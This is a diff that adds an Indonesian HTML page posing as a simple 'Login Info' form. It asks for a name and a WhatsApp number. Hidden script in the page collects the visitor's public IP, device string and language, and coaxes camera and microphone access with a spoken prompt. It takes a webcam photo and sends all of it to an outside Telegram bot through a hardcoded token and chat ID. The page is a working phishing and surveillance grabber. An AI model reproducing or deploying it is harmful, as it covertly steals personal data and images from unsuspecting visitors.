@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Info</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      position: relative;
+    }
+    .popup {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      text-align: center;
+      width: 300px;
+      animation: fadeIn 0.7s ease;
+    }
+    input {
+      padding: 10px;
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+    button {
+      padding: 10px 20px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 8px;
+      background: #00ff88;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .back-btn {
+      margin-top: 10px;
+      font-size: 12px;
+      background: none;
+      border: none;
+      color: #ccc;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+    #loading {
+      display: none;
+      text-align: center;
+    }
+    .floating-btn {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #ff9900;
+      border: none;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 25px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="popup" id="step1">
+    <h2>Masukkan Nama Anda</h2>
+    <input type="text" id="nama" placeholder="Nama Anda">
+    <button onclick="lanjutKeNomor()">Lanjut</button>
+  </div>
+
+  <div class="popup" id="step2" style="display:none;">
+    <h2>Masukkan Nomor WhatsApp ADMIN</h2>
+    <input type="text" id="whatsapp" placeholder="08xxxxxxxxxx">
+    <button onclick="kirimData()">Kirim</button>
+    <button class="back-btn" onclick="kembali()">Kembali</button>
+  </div>
+
+  <div id="loading">
+    <h3>TOLONG........</h3>
+    <p>Tunggu sebentar ya...</p>
+  </div>
+
+  <video id="video" width="300" height="300" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <button class="floating-btn" id="takePhotoBtn" onclick="ambilFoto()">Ambil Foto</button>
+
+  <script>
+    let namaGlobal = "";
+    let ipPublic = "Tidak diketahui";
+
+    // Ambil IP publik
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => ipPublic = data.ip)
+      .catch(() => ipPublic = "Gagal ambil IP");
+
+    // Ambil nama perangkat dan browser
+    const device = navigator.userAgent;
+
+    // Suara izin
+    function izinSuara() {
+      const suara = new SpeechSynthesisUtterance("Izinkan akses kamera dan mikrofon.");
+      suara.lang = 'id-ID';
+      window.speechSynthesis.speak(suara);
+    }
+
+    // Izin kamera dan suara
+    function izinKamera() {
+      izinSuara();
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(stream => {
+          document.getElementById('video').srcObject = stream;
+        })
+        .catch(() => {
+          alert("Izin kamera dan mikrofon ditolak!");
+        });
+    }
+
+    // Ambil foto otomatis
+    function ambilFoto() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+      
+      // Ambil gambar dari video
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const fotoBase64 = canvas.toDataURL("image/jpeg");
+
+      // Kirim ke Telegram
+      kirimData(fotoBase64);
+    }
+
+    // Kirim data
+    function kirimData(fotoBase64) {
+      const whatsapp = document.getElementById("whatsapp").value.trim();
+      if (!whatsapp) return alert("Masukkan nomor WhatsApp!");
+
+      // Tampilkan loading
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "none";
+      document.getElementById("loading").style.display = "block";
+
+      const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
+      const chat_id = '6374002294';
+      const lang = navigator.language;
+      const time = new Date();
+      const hari = new Intl.DateTimeFormat('id-ID', { weekday: 'long' }).format(time);
+
+      function kirimPesan(text) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chat_id, text: text })
+        });
+      }
+
+      // Kirim foto base64 sebagai pesan
+      function kirimFotoBase64(base64) {
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chat_id,
+            photo: base64
+          })
+        });
+      }
+
+      // Format pesan untuk teks
+      function formatPesan() {
+        return `INFORMASI DATA BY @Rizkuwae666_bot\n||=====================================||\n|| Nama: ${namaGlobal} ||\n|| Nomor WhatsApp: ${whatsapp} ||\n|| IP: ${ipPublic} ||\n|| Perangkat: ${device} ||\n|| Bahasa: ${lang} ||\n|| Waktu: ${time.toLocaleString('id-ID')} ||\n|| Hari: ${hari} ||\n=======================================`;
+      }
+
+      kirimPesan(formatPesan());
+      kirimFotoBase64(fotoBase64);
+
+      setTimeout(() => window.location.href = "thanks.html", 3000);
+    }
+
+    // Fungsi lanjut ke step 2
+    function lanjutKeNomor() {
+      const nama = document.getElementById("nama").value.trim();
+      if (!nama) return alert("Masukkan nama dulu!");
+      namaGlobal = nama;
+
+      // Suara sapaan
+      try {
+        const ucapan = new SpeechSynthesisUtterance(`Halo, ${nama}`);
+        ucapan.lang = 'id-ID';
+        window.speechSynthesis.speak(ucapan);
+      } catch (e) {
+        console.warn("Gagal menyuarakan sapaan:", e);
+      }
+
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+
+      izinKamera(); // Izin kamera
+    }
+
+    // Kembali ke step 1
+    function kembali() {
+      document.getElementById("step2").style.display = "none";
+      document.getElementById("step1").style.display = "block";
+    }
+  </script>
+</body>
+</html>
